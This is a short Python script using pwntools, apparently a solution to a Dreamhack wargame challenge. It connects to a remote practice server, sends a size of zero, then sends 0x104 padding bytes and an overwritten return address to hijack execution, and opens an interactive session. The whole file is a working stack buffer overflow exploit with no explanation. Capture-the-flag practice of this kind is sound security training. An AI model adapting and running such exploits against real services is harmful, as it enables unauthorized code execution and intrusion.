from pwn import *

r = remote("host2.dreamhack.games", 17203)

addr = 0x08048659

r.recvuntil("Size: ")
r.send("0")

r.send(b"a"*0x104+p32(addr))

r.interactive()